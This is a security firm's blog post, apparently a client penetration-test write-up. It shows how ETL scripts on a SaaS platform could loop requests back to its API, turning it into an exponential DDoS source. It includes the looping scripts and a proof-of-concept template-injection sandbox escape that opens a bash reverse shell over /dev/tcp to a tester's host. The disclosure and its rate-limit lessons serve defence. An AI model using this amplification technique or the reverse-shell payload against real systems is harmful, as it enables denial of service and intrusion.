---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-24_recursive-amplification-attacks-botnet-as-a-service.md
original_filename: 2024-07-24_recursive-amplification-attacks-botnet-as-a-service.md
title: 'Recursive Amplification Attacks: Botnet-as-a-Service'
category: documents
detected_topics:
- supply-chain
- command-injection
- automation-abuse
- cloud-security
- access-control
- rate-limit
tags:
- imported
- documents
- supply-chain
- command-injection
- automation-abuse
- cloud-security
- access-control
- rate-limit
language: en
raw_sha256: 3ae6a7a89fe285272e1c59935485882d0b0a3ce62f6278998f8a63ca1d685845
text_sha256: b8b7e5a510c4632b48763740f702be948f57ee4dbccb8cbda5e022bcff5a2e7c
ingested_at: '2026-06-28T07:32:36Z'
sensitivity: unknown
redactions_applied: false
---

# Recursive Amplification Attacks: Botnet-as-a-Service

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-24_recursive-amplification-attacks-botnet-as-a-service.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, automation-abuse, cloud-security, access-control, rate-limit
- Ingested At: 2026-06-28T07:32:36Z
- Redactions Applied: False
- Raw SHA256: `3ae6a7a89fe285272e1c59935485882d0b0a3ce62f6278998f8a63ca1d685845`
- Text SHA256: `b8b7e5a510c4632b48763740f702be948f57ee4dbccb8cbda5e022bcff5a2e7c`


## Content

---
title: "Recursive Amplification Attacks: Botnet-as-a-Service"
page_title: "Recursive Amplification Attacks: Botnet-as-a-Service | Praetorian"
url: "https://www.praetorian.com/blog/recursive-amplification-attacks-botnet-as-a-service/"
final_url: "https://www.praetorian.com/blog/recursive-amplification-attacks-botnet-as-a-service/"
authors: ["Ben Kofman", "Ryan Grunsten"]
bugs: ["DDoS"]
publication_date: "2024-07-24"
added_date: "2024-09-18"
source: "pentester.land/writeups.json"
original_index: 138
---

Skip to content

**Meet Constantine – Find Mythos-level vulnerabilities in your code. It proves them, patches them, PRs them back. Autonomously.**

[ Download Datasheet ](/resources/constantine-datasheet/)

[ ![Praetorian](https://www.praetorian.com/wp-content/uploads/2025/10/praetorian-logo-final-white.svg) ](https://www.praetorian.com)

  * Platform  Close Platform Open Platform

#### [Praetorian Guard Platform](/guard/)

  * [Adversarial Exposure Validation](https://www.praetorian.com/guard/breach-attack-simulation/)
  * [Attack Surface Management](https://www.praetorian.com/guard/attack-surface-management/)
  * [Continuous Penetration Testing](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [Continuous Threat Exposure Management](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [Cyber Threat Intelligence](https://www.praetorian.com/guard/threat-intelligence/)
  * [Unified Vulnerability Management](https://www.praetorian.com/guard/vulnerability-management/)
  * [Adversarial Exposure Validation](https://www.praetorian.com/guard/breach-attack-simulation/)
  * [Attack Surface Management](https://www.praetorian.com/guard/attack-surface-management/)
  * [Continuous Penetration Testing](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [Continuous Threat Exposure Management](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [Cyber Threat Intelligence](https://www.praetorian.com/guard/threat-intelligence/)
  * [Unified Vulnerability Management](https://www.praetorian.com/guard/vulnerability-management/)

  * Services  Close Services Open Services

#### [Penetration Testing Services](/penetration-testing/)

  * [LLM Penetration Testing](https://www.praetorian.com/services/ai-ml-penetration-testing/)
  * [Application Penetration Testing](https://www.praetorian.com/services/application-penetration-testing/)
  * [Automotive Penetration Testing](https://www.praetorian.com/services/automotive-penetration-testing/)
  * [Cloud Penetration Testing](https://www.praetorian.com/services/cloud-penetration-testing/)
  * [IoT Penetration Testing](https://www.praetorian.com/services/iot-penetration-testing/)
  * [Network Penetration Testing](https://www.praetorian.com/services/network-penetration-testing/)
  * [LLM Penetration Testing](https://www.praetorian.com/services/ai-ml-penetration-testing/)
  * [Application Penetration Testing](https://www.praetorian.com/services/application-penetration-testing/)
  * [Automotive Penetration Testing](https://www.praetorian.com/services/automotive-penetration-testing/)
  * [Cloud Penetration Testing](https://www.praetorian.com/services/cloud-penetration-testing/)
  * [IoT Penetration Testing](https://www.praetorian.com/services/iot-penetration-testing/)
  * [Network Penetration Testing](https://www.praetorian.com/services/network-penetration-testing/)

#### [Advanced Offensive Security](/advanced-penetration-testing/)

  * [Assumed Breached](https://www.praetorian.com/services/assumed-breached-exercise/)
  * [Attack Path Mapping](https://www.praetorian.com/guard/attack-path-mapping/)
  * [CI/CD Attack Chains](https://www.praetorian.com/services/ci-cd-security-engagement/)
  * [Purple Team](https://www.praetorian.com/services/purple-team/)
  * [Red Team](https://www.praetorian.com/services/red-team/)
  * [Assumed Breached](https://www.praetorian.com/services/assumed-breached-exercise/)
  * [Attack Path Mapping](https://www.praetorian.com/guard/attack-path-mapping/)
  * [CI/CD Attack Chains](https://www.praetorian.com/services/ci-cd-security-engagement/)
  * [Purple Team](https://www.praetorian.com/services/purple-team/)
  * [Red Team](https://www.praetorian.com/services/red-team/)

#### [Continuous Offensive Security](/guard/)

  * [Adversarial Exposure Validation](https://www.praetorian.com/guard/breach-attack-simulation/)
  * [Attack Surface Management](https://www.praetorian.com/guard/attack-surface-management/)
  * [Continuous Penetration Testing](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [Continuous Threat Exposure Management](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [Cyber Threat Intelligence](https://www.praetorian.com/guard/threat-intelligence/)
  * [Unified Vulnerability Management](https://www.praetorian.com/guard/vulnerability-management/)
  * [Adversarial Exposure Validation](https://www.praetorian.com/guard/breach-attack-simulation/)
  * [Attack Surface Management](https://www.praetorian.com/guard/attack-surface-management/)
  * [Continuous Penetration Testing](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [Continuous Threat Exposure Management](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [Cyber Threat Intelligence](https://www.praetorian.com/guard/threat-intelligence/)
  * [Unified Vulnerability Management](https://www.praetorian.com/guard/vulnerability-management/)

  * Why Praetorian  Close Why Praetorian Open Why Praetorian

#### [Customer Case Studies](/customer-success-in-cybersecurity/)

  * [21st Century Fox](https://www.praetorian.com/customer-success-in-cybersecurity/21st-century-fox/)
  * [Cushman & Wakefield](https://www.praetorian.com/customer-success-in-cybersecurity/cushman-wakefield/)
  * [Bookings Holdings](https://www.praetorian.com/customer-success-in-cybersecurity/cybersecurity-partnership-bookings-holdings/)
  * [Nielsen](https://www.praetorian.com/customer-success-in-cybersecurity/nielsen/)
  * [OpenTable](https://www.praetorian.com/customer-success-in-cybersecurity/open-table/)
  * [Priceline](https://www.praetorian.com/customer-success-in-cybersecurity/priceline/)
  * [Samsung](https://www.praetorian.com/customer-success-in-cybersecurity/samsung-electronics/)
  * [X](https://www.praetorian.com/customer-success-in-cybersecurity/x-twitter/)
  * [Zoom](https://www.praetorian.com/customer-success-in-cybersecurity/zoom-2/)
  * [See All Customers](https://www.praetorian.com/customer-success-in-cybersecurity/)
  * [21st Century Fox](https://www.praetorian.com/customer-success-in-cybersecurity/21st-century-fox/)
  * [Cushman & Wakefield](https://www.praetorian.com/customer-success-in-cybersecurity/cushman-wakefield/)
  * [Bookings Holdings](https://www.praetorian.com/customer-success-in-cybersecurity/cybersecurity-partnership-bookings-holdings/)
  * [Nielsen](https://www.praetorian.com/customer-success-in-cybersecurity/nielsen/)
  * [OpenTable](https://www.praetorian.com/customer-success-in-cybersecurity/open-table/)
  * [Priceline](https://www.praetorian.com/customer-success-in-cybersecurity/priceline/)
  * [Samsung](https://www.praetorian.com/customer-success-in-cybersecurity/samsung-electronics/)
  * [X](https://www.praetorian.com/customer-success-in-cybersecurity/x-twitter/)
  * [Zoom](https://www.praetorian.com/customer-success-in-cybersecurity/zoom-2/)
  * [See All Customers](https://www.praetorian.com/customer-success-in-cybersecurity/)

#### Resources

  * [Security Blog](https://www.praetorian.com/blog/)
  * [Resource Library](https://www.praetorian.com/resources/)
  * [Security 101](/security-101/)
  * [Labs](https://www.praetorian.com/praetorian-labs/)
  * [GitHub](https://github.com/praetorian-inc/)
  * [MITRE ATT&CK](https://www.praetorian.com/mitre-attack/)
  * [Speaking and Events](https://www.praetorian.com/speaking-and-events/)
  * [Warlocks](https://wherewarlocksstayuplate.com/)
  * [Security Blog](https://www.praetorian.com/blog/)
  * [Resource Library](https://www.praetorian.com/resources/)
  * [Security 101](/security-101/)
  * [Labs](https://www.praetorian.com/praetorian-labs/)
  * [GitHub](https://github.com/praetorian-inc/)
  * [MITRE ATT&CK](https://www.praetorian.com/mitre-attack/)
  * [Speaking and Events](https://www.praetorian.com/speaking-and-events/)
  * [Warlocks](https://wherewarlocksstayuplate.com/)

#### Use Cases

  * [ASM for Healthcare](https://www.praetorian.com/guard/attack-surface-management-healthcare/)
  * [Bug Bounty Cost Reduction](https://www.praetorian.com/services/bug-bounty-cost-reduction/)
  * [FDA Testing and Monitoring](https://www.praetorian.com/services/fda-testing-monitoring/)
  * [Mergers and Acquisitions](https://www.praetorian.com/services/mergers-acquisitions/)
  * [Ransomware Prevention](https://www.praetorian.com/services/ransomware-prevention/)
  * [Rogue IT Identification](https://www.praetorian.com/services/rogue-it-identification/)
  * [Tool and Vendor Consolidation](https://www.praetorian.com/services/tool-vendor-consolidation/)
  * [Vendor Risk Management](https://www.praetorian.com/services/vendor-risk-management/)
  * [ASM for Healthcare](https://www.praetorian.com/guard/attack-surface-management-healthcare/)
  * [Bug Bounty Cost Reduction](https://www.praetorian.com/services/bug-bounty-cost-reduction/)
  * [FDA Testing and Monitoring](https://www.praetorian.com/services/fda-testing-monitoring/)
  * [Mergers and Acquisitions](https://www.praetorian.com/services/mergers-acquisitions/)
  * [Ransomware Prevention](https://www.praetorian.com/services/ransomware-prevention/)
  * [Rogue IT Identification](https://www.praetorian.com/services/rogue-it-identification/)
  * [Tool and Vendor Consolidation](https://www.praetorian.com/services/tool-vendor-consolidation/)
  * [Vendor Risk Management](https://www.praetorian.com/services/vendor-risk-management/)

  * About  Close About Open About

#### [About Praetorian](/praetorian-offensive-cybersecurity-company/)

  * [Overview](https://www.praetorian.com/about-us/)
  * [In the News](/news/news/)
  * [Press Releases](/news/press-release/)
  * [Contact Us](https://www.praetorian.com/contact-us/)
  * [Overview](https://www.praetorian.com/about-us/)
  * [In the News](/news/news/)
  * [Press Releases](/news/press-release/)
  * [Contact Us](https://www.praetorian.com/contact-us/)

#### [Join Praetorian](/careers/#job-opening)

  * [Culture](https://www.praetorian.com/work-at-praetorian/)
  * [People Ops Blog](/people-ops/)
  * [New Hire Survival Guide](/wp-content/uploads/2024/11/Praetorian-Survival-Guide.pdf)
  * [Tech Challenges​](https://www.praetorian.com/challenges/)
  * [Job Postings](https://www.praetorian.com/careers/#job-opening)
  * [Culture](https://www.praetorian.com/work-at-praetorian/)
  * [People Ops Blog](/people-ops/)
  * [New Hire Survival Guide](/wp-content/uploads/2024/11/Praetorian-Survival-Guide.pdf)
  * [Tech Challenges​](https://www.praetorian.com/challenges/)
  * [Job Postings](https://www.praetorian.com/careers/#job-opening)

  * [ Platform Demo  ](/praetorian-guard-demo/)

  * [ Contact Us  ](/contact-us/)

  * [Cloud Security](https://www.praetorian.com/category/cloud-security/)

# Recursive Amplification Attacks: Botnet-as-a-Service

  * [Ben Kofman](https://www.praetorian.com/author/ben-kofman/), [Ryan Grunsten](https://www.praetorian.com/author/ryan-grunsten/)
  * [ July 24, 2024 ](https://www.praetorian.com/blog/2024/07/24/)

![](https://www.praetorian.com/wp-content/uploads/2024/07/ddos-recursive-loop.png)

## Introduction

On a recent client engagement, we tested a startup’s up-and-coming SaaS data platform and discovered an alarming attack path. The specific feature names and technologies have been generalized to anonymize the platform. Like many data platforms, various source types could be configured to ingest data, such as third-party CRM or marketing services. The platform also provided methods of ingesting raw data, including SDKs for popular languages and a public-facing API. The client wanted us to focus on testing this public source API for susceptibility to Distributed Denial of Service (DDoS) attacks. As described throughout this post, we demonstrated how a self-sign-up user could utilize the platform to spawn a botnet and launch a DDoS attack against **anyone**.

## Architecture

The application provided a set of extract, transform, and load (ETL) capabilities to process the ingested data. Basic statistics were reported on the total number and rate of incoming source events, ETL transformations, and deliveries, as well as any failures that occur throughout the path of flow. One such ETL capability was to use a custom transformation script, which processed each event and returned the modified data to be sent to its configured destination. These scripts are executed bya serverless cloud computing service – providing theoretically unlimited scaling power. Possible destinations included a wide range of external services for analytics, automation, storage, and other similar functions.

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20203'%3E%3C/svg%3E)

_Basic flow diagram: Public API - > ETL script -> Storage _

The ETL tasks provided a sandboxed script environment to perform transformations on the data. As part of normal application functionality, HTTP requests could be sent anywhere. For example, event data could be sent directly to a user-controlled API after performing transformations defined by the user.

One attack path we explored was obtaining the transformation runner’s credentials to enumerate its access, which we retrieved by querying the runtime API and dumping the configuration of the preconfigured cloud service SDK.

While the runner’s credentials were retrieved successfully, this attack path was ultimately unfruitful. The runner definition itself was short-lived and spawned only to execute the user’s script. As a result, it was properly configured with the least amount of privileges, preventing privilege escalation in the client’s cloud environment.

## The Exploit

Our primary target was the public source API and whether it could be leveraged to perform a DDoS attack. When the public source API receives an authenticated request, the event is forwarded to the ETL service to be processed by the user’s custom script. This gave us an idea – can we send requests back to the source API using the ETL script itself?
  
  
  
  async function transform(event) {
  const url = 'https://[API-URL]'
  method: 'POST',
  headers: {
  'Content-Type': 'application/json'
  },
  body: JSON.stringify({
  '[REQUIRED_KEYS]': '[REQUIRED_VALUES]',
  'APIKEY': '[OUR_API_KEY]'
  })
  })
  
  return event // No changes
  }
  
  

_Example ETL script sending a valid API request_

We expected there to be some controls preventing the ETL script from making a network connection back to the API, as this defied the expected logic of the platform and was a completely unnecessary use case. We found, however, that as long as our request was correctly authenticated, it would be accepted.

While monitoring the event statistics, we could see the number of events slowly increase. After sending a single API request from our machine, the source API forwarded the event data to a new ETL runner, which sent a new request back to the API, forwarding the event to another ETL runner, hence creating a loop.

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20455%20359'%3E%3C/svg%3E)

_Loop between the API and the next ETL runner_

While entertaining, a slow number of looping events did not constitute a security issue. We disabled the API source in our account after a few minutes, after the total number of events hit around 500. We then wondered – what would happen if our script sent not one, but **two** API requests?

Each new request would result in a new runner sending two more requests back to the API, and the number of new events being created at a time would continue to double. Two requests would become four, then eight, then sixteen… Theoretically, the number of requests would grow at an exponential rate.

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20743%20537'%3E%3C/svg%3E)

_Recursive loop doubling the number of new requests_

While exponential growth would result in the total number of new events rapidly increasing, we suspected there may be some rate-limiting in place to either throttle the number of new events getting created or lock the API key from making further requests to the public API. To test this, we adjusted our script to make two requests instead of one and launched the attack.
  
  
  
  async function transform(event) {
  const url = 'https://[API-URL]'
  
  // Send a two events back to the API-URL
  for (let i = 0; i < 2; i++) {
  let response = await fetch(url, {
  method: {
  'Content-Type': 'application/json'
  },
  body: JSON.stringify({
  '[REQUIRED_KEYS]': '[REQUIRED_VALUES]',
  'APIKEY': '[OUR_API_KEY]'
  })
  })
  }
  
  return event // No Changes
  }
  
  
  

_Two API requests were sent from each ETL runner_

We sent a single manual request to trigger the recursive loop, and then carefully monitored the event statistics dashboard, prepared to disable the API ingestion if the number of events spiraled out of control. When the number of events jumped from ~50,000 to ~250,000 after a couple of seconds, we disabled the source API, killing the loop and preventing any additional ETL runners from executing. The dashboard’s numbers were lagging behind the actual traffic statistics, and the numbers kept increasing before finally arriving at the true total. In the two minutes between our first request and the last, the total number of events had risen beyond **10 million**.

The platform’s free tier had generous limits to the number of API calls that could be made per month, but these limits were far surpassed during the two minutes in which the recursive loop ran. According to the documentation, after exceeding the monthly limit, the account is locked, but data can still be ingested. The account was eventually locked when the usage counts updated, several minutes after disabling the source API – although if the loop was left to run, it’s not known how many events could have been generated, as no existing controls seemed to be able to stop the amount from growing for potentially several minutes or longer. Certain serverless compute services such as AWS Lambda have [recursion detection](https://docs.aws.amazon.com/lambda/latest/dg/invocation-recursion.html#invocation-recursion-supportedservices), but only when the invocations are triggered by SNS, SQS, or other Lambda functions, not other AWS services like API Gateway.

To transform this attack into a DDoS against arbitrary third parties, the runner script could have been easily modified to include a request to any external endpoint, flooding that endpoint with millions of HTTP requests in a couple of minutes. Furthermore, serverless functions are generally backed by the compute service of the cloud provider, and thus also share the compute service’s public IP space. As a result, the requests would be distributed over a wide range of IP addresses, making mitigation of the attack much more complex.

## But Wait, There’s More

While we had already identified a DDoS vulnerability, a question lingered in our minds. What if we could escape the script runner’s sandbox, allowing us to take control over the underlying serverless infrastructure? If successful, this would grant us an arbitrary, exponentially growing source of compute power: a Botnet-on-Demand.

The sandbox environment in which the ETL scripts ran was devoid of packages normally used for escape, such as libraries that support file I/O and system process execution. Only basic data manipulation and HTTP request libraries could be accessed. But any time an application executes a user’s custom code, there is **usually** a way to escape sandbox jail and access the underlying system. After exploring various sandbox escape methods using the existing packages, we eventually realized that one of the packages was outdated and vulnerable to a Code Injection CVE. We leveraged it to achieve remote code execution on the underlying runner.
  
  
  
  _.template('',{ variable: '){
  process.binding('spawn_sync').spawn({
  file: '/bin/bash',
  args: [
  '/bin/bash', '-c', 'sh -i >& /dev/tcp/[PRAETORIAN_IP:/80 0>&1'
  ],
  stdio: [
  {type:'pipe",readble:!0,writable:!1},
  {type:'pipe",readble:!1,writable:!0},
  {type:'pipe",readble:!1,writable:!0},
  ]});
  }; with(obj`
  })()
  
  

_Proof-of-concept code to receive a shell from the runner_

Generally, it is less impactful to achieve RCE on serverless infrastructure than on persistent machines. The cloud permissions of the runner and network configuration limited any further access, and each runner was terminated after 30 seconds. However, shell access allows the recursive amplification attack to be supplemented with other types of traffic, like raw TCP, UDP, or ICMP packets, creating a more potent and versatile DDoS attack platform.

## Conclusion

The platform documentation mentioned a rate limit for the API and claimed that exceeding it would result in queued requests. This rate limit was not being enforced, however, and was only mentioned in case a customer’s account needed to be manually throttled.

The rationale behind this design was likely to prevent data loss due to an accidental misconfiguration, giving users a chance to fix their deployment without losing data. Nonetheless, the lack of a harsher rate limit was critical in escalating the security implications of this vulnerability.

While this issue may have caused a [Denial-of-Wallet](https://portswigger.net/daily-swig/denial-of-wallet-attacks-how-to-protect-against-costly-exploits-targeting-serverless-setups) against the platform itself, it certainly could have brought down smaller sites without comprehensive DDoS protection, at least until the platform itself failed. The client has since mitigated the issue by implementing a realistic upper-bound rate limit per API key, which if exceeded will result in queued requests, and at a certain point will result in an HTTP 429 response. 

This vulnerability demonstrates how important strictly enforced rate limits are for extensible SaaS data platforms, especially when leveraging highly scalable infrastructure like serverless technology. We were able to exploit this issue using an anonymous, free tiered, self-sign-up account without entering any billing information. We have seen many recent cases of developers being charged an arm and a leg for runaway serverless compute costs, sometimes due to [programming mistakes](https://www.theregister.com/2020/12/10/google_cloud_over_run/), and other times as a result of DDoS attacks. SaaS applications need to consider not only how to protect their platform and customers from an attacker, but how an attacker can leverage the features of the platform to target external organizations. Simple logic flaws can lead to major security consequences, resulting in reputational damage, runaway bills, and suspensions by infrastructure providers.

## About the Authors

![Ben Kofman](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E)

### [Ben Kofman](https://www.praetorian.com/author/ben-kofman/)

![Ryan Grunsten](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E)

### [Ryan Grunsten](https://www.praetorian.com/author/ryan-grunsten/)

## Catch the Latest

Catch our latest exploits, news, articles, and events.

[](https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/)

  * [Offensive Security](https://www.praetorian.com/category/offensive-security/), [Vulnerability Research](https://www.praetorian.com/category/vulnerability-research/)

  * June 19, 2026

[](https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/)

## [GhostPack Necromancy: Reforging C# Tools with WasmForge](https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/)

[ Read More ](https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/)

[](https://www.praetorian.com/blog/ai-vulnerability-research-freebsd-kernel/)

  * [Offensive Security](https://www.praetorian.com/category/offensive-security/), [Vulnerability Research](https://www.praetorian.com/category/vulnerability-research/)

  * June 17, 2026

[](https://www.praetorian.com/blog/ai-vulnerability-research-freebsd-kernel/)

## [FreeBSoD: Leveraging Language Models to Find and Exploit Kernel Bugs (Part 1 of 2)](https://www.praetorian.com/blog/ai-vulnerability-research-freebsd-kernel/)

[ Read More ](https://www.praetorian.com/blog/ai-vulnerability-research-freebsd-kernel/)

[](https://www.praetorian.com/blog/sharing-is-caring-smb-secret-scanning-with-sulla/)

  * [Uncategorized](https://www.praetorian.com/category/uncategorized/)

  * June 16, 2026

[](https://www.praetorian.com/blog/sharing-is-caring-smb-secret-scanning-with-sulla/)

## [Sharing is Caring: SMB Secret Scanning with Sulla](https://www.praetorian.com/blog/sharing-is-caring-smb-secret-scanning-with-sulla/)

[ Read More ](https://www.praetorian.com/blog/sharing-is-caring-smb-secret-scanning-with-sulla/)

## Ready to Discuss Your Next Continuous Threat Exposure Management Initiative?

Praetorian’s Offense Security Experts are Ready to Answer Your Questions

[ Get Started ](/contact-us/)

[ ![Praetorian](https://www.praetorian.com/wp-content/uploads/2025/10/praetorian-logo-final-white.svg) ](https://www.praetorian.com)

##### [Praetorian Guard Platform](https://www.praetorian.com/guard)

  * [ Continuous Threat Exposure Management ](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [ Attack Surface Management ](https://www.praetorian.com/guard/attack-surface-management/)
  * [ Vulnerability Management ](/chariot/vulnerability-management/)
  * [ Cyber Threat Intelligence ](/chariot/threat-intelligence/)
  * [ Continuous Penetration Testing ](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [ Breach and Attack Simulation ](https://www.praetorian.com/guard/breach-attack-simulation/)

##### Professional Services

  * [ AI/ML Penetration Testing ](https://www.praetorian.com/services/ai-ml-penetration-testing/)
  * [ Application Penetration Testing ](/services/application-penetration-testing/)
  * [ Assumed Breached Exercise ](/services/assumed-breached-exercise/)
  * [ Attack Path Mapping ](https://www.praetorian.com/resources/attack-path-mapping/)
  * [ Automotive Penetration Testing ](/services/automotive-penetration-testing/#)
  * [ CI/CD Security Engagement ](/services/ci-cd-security-engagement/)
  * [ Cloud Penetration Testing ](/services/cloud-penetration-testing/)
  * [ IoT Penetration Testing ](/services/iot-penetration-testing/)
  * [ Network Penetration Testing ](/services/network-penetration-testing/)
  * [ NIST CSF Benchmark ](/services/nist-csf-benchmark/)
  * [ Purple Team ](/services/purple-team/)
  * [ Red Team ](/services/red-team/)

##### Use Cases

  * [ Bug Bounty Cost Reduction ](/services/bug-bounty-cost-reduction/)
  * [ FDA Testing and Monitoring ](/services/fda-testing-monitoring/)
  * [ Mergers and Acquisitions ](/services/mergers-acquisitions/)
  * [ Ransomware Prevention ](/services/ransomware-prevention/)
  * [ Rogue IT Identification ](/services/rogue-it-identification/)
  * [ Tool and Vendor Consolidation ](/services/tool-vendor-consolidation/)
  * [ Vendor Risk Management ](https://www.praetorian.com/services/vendor-risk-management/)

##### Company

  * [ About Us ](https://www.praetorian.com/about-us/)
  * [ Leadership Team ](https://www.praetorian.com/leadership-team/)
  * [ Press Releases ](/news/press-release/)
  * [ In the News ](/news/news)
  * [ Contact Us ](https://www.praetorian.com/contact-us/)
  * [ Resource Library ](https://www.praetorian.com/resources/)
  * [ Security Blog ](/blog/)
  * [ People Ops Blog ](/people-ops/)
  * [ Careers ](https://www.praetorian.com/careers/)
  * [ Culture ](https://www.praetorian.com/work-at-praetorian/)
  * [ Survival Kit ](/wp-content/uploads/2024/11/Praetorian-Survival-Guide.pdf)

### Subscribe to our Newsletter

Catch our latest exploits, news, articles, and events.

[Privacy Policy](/privacy-policy/) | [Responsible Disclosure Policy](/responsible-disclosure-policy/) | [Terms of Service](/terms-of-service/) | [Terms and Conditions](/terms/)

Copyright © 2025. All Rights Reserved.

[ Linkedin-in ](https://www.linkedin.com/company/praetorian/) [ X-twitter ](https://twitter.com/praetorianlabs) [ Facebook-f ](https://www.facebook.com/praetorianlabs) [ Github ](https://github.com/praetorian-inc) [ Youtube ](https://www.youtube.com/user/PraetorianLabs)
